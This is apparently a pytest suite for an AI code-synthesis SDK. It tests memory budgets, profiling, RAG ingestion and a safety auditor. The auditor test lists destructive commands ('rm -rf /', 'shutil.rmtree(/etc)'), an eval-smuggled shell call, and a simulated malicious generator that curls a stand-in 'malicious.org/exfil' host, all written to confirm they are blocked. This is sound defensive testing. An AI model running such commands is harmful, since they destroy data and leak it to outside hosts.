"""Comprehensive End-to-End Integration and Benchmark Test Suite.

Validates the full autonomous low-resource swarm pipeline:
1. test_e2e_code_synthesis_flow: CLI code synthesis, AST validation, and module execution.
2. test_e2e_memory_benchmark: Memory delta budget (<45 MB overhead) and ceiling compliance.
3. test_e2e_tachyon_profiler_flag: Latency, CPU timing, and process RSS metrics capture.
4. test_e2e_prohibited_avx512_and_lifeguard_rejection: AVX-512 and unsafe call guard enforcement.
5. test_e2e_rag_grounded_synthesis: Markdown knowledge ingestion and RAG-grounded code generation.
"""

from __future__ import annotations

import ast
import importlib
import resource
import sys
from pathlib import Path

import pytest

from swarm_sdk import cli
from swarm_sdk.core.lifeguard_ast import MetaLifeguardAuditor
from swarm_sdk.core.rules import HostInvariants, HostRuleEngine
from swarm_sdk.orchestrator import LowSwarmEngine, SwarmState
from swarm_sdk.retrieval.rag_ingest import RAGIngestionPipeline

# ==============================================================================
# Helper Utilities
# ==============================================================================


def _measure_rss_mb() -> float:
    """Returns current process ru_maxrss normalized to megabytes."""
    usage = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    if sys.platform == "darwin":
        # macOS ru_maxrss is reported in bytes
        return usage / (1024.0 * 1024.0)
    # Linux ru_maxrss is reported in kilobytes
    return usage / 1024.0


# ==============================================================================
# 1. E2E Code Synthesis Flow Test
# ==============================================================================


def test_e2e_code_synthesis_flow(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """E2E Flow: Creates initial buffer_utils.py, runs synthesis via CLI, and imports result.

    Asserts:
    - Exit code is 0 (status="success").
    - jev_decision recorded latency < 35ms.
    - lifeguard_report is approved (is_approved=True).
    - Synthesized code passes ast.parse and can be executed via Python import.
    """
    monkeypatch.chdir(tmp_path)
    monkeypatch.syspath_prepend(str(tmp_path))

    # 1. Create temporary workspace with an initial Python file
    target_file = tmp_path / "buffer_utils.py"
    target_file.write_text('"""Initial buffer utils placeholder."""\n', encoding="utf-8")

    # 2. Execute low-swarm run
    exit_code = cli.main(
        [
            "run",
            "Add zero-copy memoryview extraction function",
            "--files",
            "buffer_utils.py",
        ]
    )

    assert exit_code == 0, f"CLI invocation failed with exit code {exit_code}"

    # 3. Retrieve recorded execution state
    state = cli.get_latest_state()
    assert state is not None, "CLI failed to record execution state"
    assert state["status"] == "success"

    # Jev System-1 decision latency requirement: < 35ms
    jev = state.get("jev_decision") or {}
    assert jev.get("safe") is True
    assert "latency_ms" in jev
    assert jev["latency_ms"] < 35.0, f"Jev latency {jev['latency_ms']:.2f}ms exceeded 35ms bound"

    # MetaLifeguard approval requirement
    lifeguard = state.get("lifeguard_report") or {}
    assert lifeguard.get("is_approved") is True
    assert len(lifeguard.get("violations", [])) == 0
    assert lifeguard.get("has_prohibited_calls") is False

    # 4. Validate synthesized code on disk
    assert target_file.exists()
    content = target_file.read_text(encoding="utf-8")
    assert len(content.strip()) > 0

    # Ensure code passes AST syntax parser
    parsed_ast = ast.parse(content)
    assert parsed_ast is not None

    # 5. Execute synthesized code via Python import
    importlib.invalidate_caches()
    if "buffer_utils" in sys.modules:
        del sys.modules["buffer_utils"]
    mod = importlib.import_module("buffer_utils")

    # Verify run entrypoint
    assert hasattr(mod, "run")
    run_output = mod.run()
    assert isinstance(run_output, str)
    assert "Success" in run_output

    # Verify zero-copy memoryview function
    assert hasattr(mod, "extract_memoryview"), "Synthesized module missing extract_memoryview"
    sample_data = b"antigravity-low-resource-swarm"
    extracted_view = mod.extract_memoryview(sample_data)
    assert isinstance(extracted_view, memoryview)
    assert bytes(extracted_view) == sample_data


# ==============================================================================
# 2. E2E Memory Benchmark Test
# ==============================================================================


def test_e2e_memory_benchmark(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Measures resident memory (RSS) delta and asserts budget compliance (< 45 MB)."""
    monkeypatch.chdir(tmp_path)

    # 1. Record baseline resident memory
    rss_before_mb = _measure_rss_mb()

    # 2. Execute synthesis engine
    engine = LowSwarmEngine()
    result = engine.run(
        task="Implement high-performance zero-copy memoryview extraction",
        target_files=["buffer_utils.py"],
    )

    assert result["status"] == "success"
    assert result["lifeguard_report"]["is_approved"] is True

    # 3. Record post-execution resident memory
    rss_after_mb = _measure_rss_mb()
    rss_delta_mb = max(0.0, rss_after_mb - rss_before_mb)

    # Asserts that memory delta remains within the low-resource budget (<45 MB overhead)
    assert rss_delta_mb < 45.0, f"Memory delta ({rss_delta_mb:.2f} MB) exceeded budget (< 45 MB)"

    # Asserts total process RSS is within host hard ceiling (< 13.6 GB)
    current_rss_gb = engine.get_current_rss_gb()
    ceiling_gb = engine.rule_engine.invariants.ram_ceiling_gb
    assert current_rss_gb < ceiling_gb, (
        f"Process RSS ({current_rss_gb:.2f} GB) exceeded host ceiling ({ceiling_gb:.2f} GB)"
    )

    # 4. Burst synthesis loop: Ensure 5 consecutive iterations remain within budget
    for i in range(5):
        burst_res = engine.run(
            task=f"Synthesize helper iteration {i}",
            target_files=[f"helper_{i}.py"],
        )
        assert burst_res["status"] == "success"

    burst_after_mb = _measure_rss_mb()
    burst_delta_mb = max(0.0, burst_after_mb - rss_before_mb)
    assert burst_delta_mb < 45.0, (
        f"Burst synthesis memory delta ({burst_delta_mb:.2f} MB) exceeded budget (< 45 MB)"
    )


# ==============================================================================
# 3. E2E Tachyon Profiler Flag Test
# ==============================================================================


def test_e2e_tachyon_profiler_flag(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """Executes low-swarm run ... --profile and verifies wall-clock/CPU telemetry."""
    monkeypatch.chdir(tmp_path)

    # 1. Execute CLI with --profile flag
    exit_code = cli.main(
        [
            "run",
            "Implement SIMD-accelerated array dot product",
            "--files",
            "dot_product.py",
            "--profile",
        ]
    )

    assert exit_code == 0
    state = cli.get_latest_state()
    assert state is not None
    assert state["status"] == "success"

    # 2. Verify state dictionary contains wall-clock and CPU metrics
    metrics = state.get("metrics")
    assert isinstance(metrics, dict), "State missing metrics dictionary"
    assert "wall_clock_ms" in metrics
    assert metrics["wall_clock_ms"] > 0.0
    assert "cpu_time_ms" in metrics
    assert metrics["cpu_time_ms"] >= 0.0
    assert "rss_gb" in metrics
    assert metrics["rss_gb"] > 0.0

    # 3. Verify console output renders profile diagnostics
    captured = capsys.readouterr()
    out = captured.out
    assert "Profile Latency" in out or "ms" in out
    assert "Process RSS" in out or "GB" in out
    assert "CPU Time" in out

    # 4. Verify programmatic engine profiling
    engine = LowSwarmEngine()
    prog_state = engine.run("Quick calculation", target_files=["calc.py"], profile=True)
    assert prog_state["status"] == "success"
    assert "wall_clock_ms" in prog_state["metrics"]
    assert "cpu_time_ms" in prog_state["metrics"]
    assert prog_state["metrics"]["wall_clock_ms"] > 0.0


# ==============================================================================
# 4. Prohibited AVX-512 and Lifeguard Rejection Test
# ==============================================================================


def test_e2e_prohibited_avx512_and_lifeguard_rejection(capsys: pytest.CaptureFixture[str]) -> None:
    """Simulates forbidden AVX-512 compiler flags and top-level unsafe calls.

    Asserts that HostRuleEngine and MetaLifeguardAuditor reject the code and
    halt execution appropriately.
    """
    rule_engine = HostRuleEngine()

    # 1. HostRuleEngine: Prohibited AVX-512 compiler flags rejection
    forbidden_compiler_commands = [
        "clang -O3 -mavx512f -o vector vector.c",
        "gcc -mavx512cd -mavx512bw compute.c",
        "clang++ -O3 +avx512 -o math math.cpp",
        "cmake -DENABLE_AVX512=ON ..",
        "ninja -C build CFLAGS='-mavx512vl'",
    ]

    for cmd in forbidden_compiler_commands:
        safe, reason = rule_engine.validate_command_safety(cmd)
        assert not safe, f"Expected command '{cmd}' to be rejected"
        assert reason is not None
        assert "AVX-512" in reason

    # Enforce AVX-512 cannot be marked as supported in host profile
    with pytest.raises(ValueError, match="AVX-512 is strictly prohibited"):
        HostInvariants(simd_supported=["AVX2", "FMA", "AVX-512"])

    # 2. MetaLifeguardAuditor: Prohibited top-level unsafe operations rejection
    unsafe_code_snippets = [
        (
            "import os\nos.system('rm -rf / --no-preserve-root')\n",
            "os.system",
        ),
        (
            "import subprocess\nsubprocess.run(['rm', '-rf', '/tmp/data'])\n",
            "subprocess",
        ),
        (
            "import shutil\nshutil.rmtree('/etc')\n",
            "shutil.rmtree",
        ),
        (
            'eval(\'__import__("os").system("echo unsafe")\')\n',
            "eval",
        ),
    ]

    for code, expected_violator in unsafe_code_snippets:
        report = MetaLifeguardAuditor.audit_code(code)
        assert report.is_approved is False, f"Code '{code}' should have been rejected by Lifeguard"
        assert report.has_prohibited_calls is True
        assert len(report.violations) > 0
        violation_messages = " ".join(v.message for v in report.violations)
        assert expected_violator in violation_messages

    # Unlazy import rejection
    unlazy_code = "import torch\nimport numpy as np\n"
    unlazy_report = MetaLifeguardAuditor.audit_code(unlazy_code, enforce_lazy=True)
    assert unlazy_report.is_approved is False
    assert unlazy_report.has_unlazy_imports is True

    # 3. End-to-End Orchestrator Halt: Coder emitting unsafe calls is halted by Lifeguard
    def malicious_synthesizer(state: SwarmState) -> dict[str, str]:
        return {"exploit.py": "import os\nos.system('curl http://malicious.org/exfil')\n"}

    blocked_engine = LowSwarmEngine(custom_synthesizer=malicious_synthesizer)
    result = blocked_engine.run(
        task="Synthesize network helper",
        target_files=["exploit.py"],
    )

    assert result["status"] == "blocked"
    assert result["iteration"] == 3
    assert result["lifeguard_report"]["is_approved"] is False
    assert "Max resynthesis iterations reached" in str(result["error"])

    # 4. CLI Safety Halt: Dangerous destructive command blocked at router
    cli_exit = cli.main(["run", "rm -rf / --no-preserve-root"])
    assert cli_exit == 1
    captured = capsys.readouterr()
    assert "blocked" in (captured.out + captured.err).lower()


# ==============================================================================
# 5. E2E RAG Grounded Synthesis Test
# ==============================================================================


def test_e2e_rag_grounded_synthesis(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Ingests Markdown knowledge docs into RAG pipeline and runs grounded code synthesis."""
    monkeypatch.chdir(tmp_path)

    # 1. Create dummy markdown knowledge documents
    docs_dir = tmp_path / "docs"
    docs_dir.mkdir(parents=True, exist_ok=True)

    doc_memory = docs_dir / "zero_copy_architecture.md"
    doc_memory.write_text(
        """# Architectural Guidelines for Intel Core i7-9750H
## Zero-Copy Buffer Management
When implementing buffer-processing functions, always utilize Python `memoryview` objects.
Memoryview slices prevent heap allocations and preserve the strict 16 GB hardware budget.

## SIMD Constraints
Use AVX2 vector intrinsics. Do not emit AVX-512 instructions under any circumstances.
""",
        encoding="utf-8",
    )

    doc_rules = docs_dir / "safety_standards.md"
    doc_rules.write_text(
        """# Swarm Safety Standards
## Module Scope Invariants
Never execute top-level subprocess or os.system calls at module import time.
Keep all operations bounded and deterministic.
""",
        encoding="utf-8",
    )

    # 2. Ingest documents via RAGIngestionPipeline
    pipeline = RAGIngestionPipeline(embedding_dim=64)
    ingested_count = pipeline.ingest_files([docs_dir])
    assert ingested_count >= 2, f"Expected at least 2 chunks, got {ingested_count}"

    # Verify query retrieval
    retrieved = pipeline.query("zero-copy memoryview buffer", top_k=2)
    assert len(retrieved) > 0
    top_chunk = retrieved[0].chunk
    assert "memoryview" in top_chunk.full_text.lower() or "zero-copy" in top_chunk.full_text.lower()

    # 3. Execute LowSwarmEngine with grounded RAG pipeline
    engine = LowSwarmEngine(rag_pipeline=pipeline)
    result = engine.run(
        task="Add zero-copy memoryview extraction function",
        target_files=["buffer_fast.py"],
    )

    assert result["status"] == "success"
    assert result["lifeguard_report"]["is_approved"] is True
    assert result["test_results"]["passed"] is True

    # Verify context chunks were injected into state
    context_chunks = result.get("context_chunks", [])
    assert len(context_chunks) > 0, "Expected grounded RAG context chunks in state"
    assert any("zero-copy" in c.lower() or "memoryview" in c.lower() for c in context_chunks), (
        "RAG context did not include relevant knowledge chunks"
    )

    # Verify synthesized code incorporates task requirements
    synth_code = result["synthesized_code"]["buffer_fast.py"]
    assert "extract_memoryview" in synth_code or "memoryview" in synth_code
    assert ast.parse(synth_code) is not None

    # 4. CLI Ingest Integration: Test low-swarm ingest command
    rag_index_dir = tmp_path / "rag_index"
    exit_code = cli.main(
        [
            "ingest",
            "--source",
            str(docs_dir),
            "--output",
            str(rag_index_dir),
        ]
    )
    assert exit_code == 0
    assert (rag_index_dir / "chunks.json").exists()
    assert (rag_index_dir / "meta.json").exists()
